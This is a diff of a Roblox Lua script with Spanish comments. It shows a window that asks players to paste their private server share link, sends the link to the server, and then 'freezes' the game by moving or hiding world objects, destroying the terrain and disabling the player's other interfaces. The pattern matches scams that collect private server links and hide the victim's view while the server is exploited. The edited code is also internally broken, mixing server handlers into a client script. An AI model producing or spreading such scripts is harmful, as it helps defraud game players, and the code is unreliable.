@@ -1,21 +1,12 @@
---[[ 
-=========================================
-           SCRIPT COMBINADO
-=========================================
---]]
-
---==================================================
---// PARTE 1: LOCALSCRIPT (Cliente)
--- Colocar en StarterPlayerScripts o StarterGui
---==================================================
-
 local Player = game.Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Lighting = game:GetService("Lighting")
+local Workspace = game:GetService("Workspace")
+local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
 
--- ====== CREAR UI ======
+-- ====== UI ======
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "ServerLinkUI"
 ScreenGui.Parent = Player:WaitForChild("PlayerGui")
 ScreenGui.DisplayOrder = 100
 
@@ -24,7 +15,6 @@ Frame.Parent = ScreenGui
 Frame.Size = UDim2.new(0, 400, 0, 300)
 Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
 Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-Frame.BorderSizePixel = 0
 
 local Label = Instance.new("TextLabel")
 Label.Parent = Frame
@@ -33,7 +23,6 @@ Label.Position = UDim2.new(0, 10, 0, 10)
 Label.Text = "Ingresa el link de tu servidor privado:"
 Label.TextColor3 = Color3.fromRGB(255, 255, 255)
 Label.BackgroundTransparency = 1
-Label.TextScaled = true
 
 local TextBox = Instance.new("TextBox")
 TextBox.Parent = Frame
@@ -43,7 +32,6 @@ TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
 TextBox.ClearTextOnFocus = false
 TextBox.Text = "https://www.roblox.com/share?code="
-TextBox.TextScaled = true
 
 local MessageLabel = Instance.new("TextLabel")
 MessageLabel.Parent = Frame
@@ -52,7 +40,6 @@ MessageLabel.Position = UDim2.new(0, 10, 0, 110)
 MessageLabel.BackgroundTransparency = 1
 MessageLabel.Text = ""
 MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-MessageLabel.TextScaled = true
 
 local Button = Instance.new("TextButton")
 Button.Parent = Frame
@@ -61,78 +48,86 @@ Button.Position = UDim2.new(0, 10, 0, 150)
 Button.Text = "Enviar"
 Button.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
 Button.TextColor3 = Color3.fromRGB(255, 255, 255)
-Button.TextScaled = true
 
--- ====== FUNCIONES ======
+-- ====== Validación del link ======
 local function isLinkValid(link)
-	local startPart = "https://www.roblox.com/share?code="
-	local endPart = "&type=Server"
-	return string.sub(link, 1, #startPart) == startPart and string.sub(link, -#endPart) == endPart
+    local startPart = "https://www.roblox.com/share?code="
+    local endPart = "&type=Server"
+    return string.sub(link, 1, #startPart) == startPart and string.sub(link, -#endPart) == endPart
 end
 
+-- ====== Congelar el entorno ======
 local function freezeEnvironment()
-	local blur = Instance.new("BlurEffect")
-	blur.Size = 24
-	blur.Name = "FreezeBlur"
-	blur.Parent = Lighting
+    -- 1) Congelar el entorno
+    local frozenFolder = Instance.new("Folder")
+    frozenFolder.Name = "FrozenCopies"
+    frozenFolder.Parent = Workspace
+
+    -- Clonar todo el Workspace
+    local clonedWorkspace = Workspace:Clone()
+    clonedWorkspace.Name = "ClonedWorkspace"
+    clonedWorkspace.Parent = frozenFolder
+
+    -- Mover todos los objetos originales a la carpeta congelada
+    for _, obj in pairs(Workspace:GetChildren()) do
+        if obj:IsA("BasePart") or obj:IsA("Model") then
+            obj.Parent = frozenFolder
+        end
+    end
+
+    -- Manejar Terrain de manera especial
+    if Workspace:FindFirstChild("Terrain") then
+        local terrain = Workspace.Terrain:Clone()
+        terrain.Name = "FrozenTerrain"
+        terrain.Parent = frozenFolder
+        Workspace.Terrain:Destroy()
+    end
+
+    -- 2) Asegurar que el entorno congelado tape todo
+    local function onChildAdded(child)
+        if child:IsA("BasePart") or child:IsA("Model") then
+            child.Transparency = 1 -- Hacer transparente el nuevo objeto para que quede tapado
+        end
+    end
+
+    Workspace.ChildAdded:Connect(onChildAdded)
 end
 
--- ====== EVENTO DEL BOTÓN ======
+-- ====== Botón principal ======
 Button.MouseButton1Click:Connect(function()
-	local link = TextBox.Text
+    local link = TextBox.Text
+    if isLinkValid(link) then
+        MessageLabel.Text = "El link es válido ✅"
+        MessageLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+        local remoteEvent = ReplicatedStorage:FindFirstChild("SendServerLink")
+        if remoteEvent then
+            remoteEvent:FireServer(link)
+        end
+        freezeEnvironment()
 
-	if isLinkValid(link) then
-		MessageLabel.Text = "El link es válido ✅"
-		MessageLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+        -- Ocultar la interfaz del juego original para el jugador local
+        local playerGui = Player:WaitForChild("PlayerGui")
+        for _, child in pairs(playerGui:GetChildren()) do
+            if child:IsA("ScreenGui") and child.Name ~= "RobloxGui" then
+                child.Enabled = false
+            end
+        end
 
-		local remoteEvent = ReplicatedStorage:FindFirstChild("SendServerLink")
-		if remoteEvent then
-			remoteEvent:FireServer(link)
-		end
-
-		freezeEnvironment()
-
-		-- Ocultar otras GUIs del jugador
-		for _, gui in pairs(Player.PlayerGui:GetChildren()) do
-			if gui:IsA("ScreenGui") and gui.Name ~= "RobloxGui" and gui ~= ScreenGui then
-				gui.Enabled = false
-			end
-		end
-
-		task.wait(1)
-		ScreenGui:Destroy()
-	else
-		MessageLabel.Text = "El link es inválido ❌"
-		MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-	end
+        -- Eliminar completamente la UI del link
+        ScreenGui:Destroy()
+    else
+        MessageLabel.Text = "El link es inválido ❌"
+        MessageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    end
 end)
 
+-- Script en el servidor para manejar la detención de eventos
+local function onStopAllEvents(player)
+    for _, event in pairs(ReplicatedStorage:GetChildren()) do
+        if event:IsA("RemoteEvent") or event:IsA("RemoteFunction") then
+            event:FireAllClients()
+        end
+    end
+end
 
---==================================================
---// PARTE 2: SCRIPT (Servidor)
--- Colocar en ServerScriptService
---==================================================
-
--- Crear RemoteEvents si no existen
-local sendEvent = ReplicatedStorage:FindFirstChild("SendServerLink") or Instance.new("RemoteEvent")
-sendEvent.Name = "SendServerLink"
-sendEvent.Parent = ReplicatedStorage
-
-local stopEvents = ReplicatedStorage:FindFirstChild("StopAllEvents") or Instance.new("RemoteEvent")
-stopEvents.Name = "StopAllEvents"
-stopEvents.Parent = ReplicatedStorage
-
--- Cuando un jugador envía su link
-sendEvent.OnServerEvent:Connect(function(player, link)
-	print(player.Name .. " envió el link: " .. link)
-	-- Aquí puedes manejar el link (guardar, usar, etc)
-end)
-
--- Ejemplo de manejo de StopAllEvents
-stopEvents.OnServerEvent:Connect(function(player)
-	for _, event in pairs(ReplicatedStorage:GetChildren()) do
-		if event:IsA("RemoteEvent") or event:IsA("RemoteFunction") then
-			print("Evento detenido: " .. event.Name)
-		end
-	end
-end)
+ReplicatedStorage:WaitForChild("StopAllEvents").OnServerEvent:Connect(onStopAllEvents)
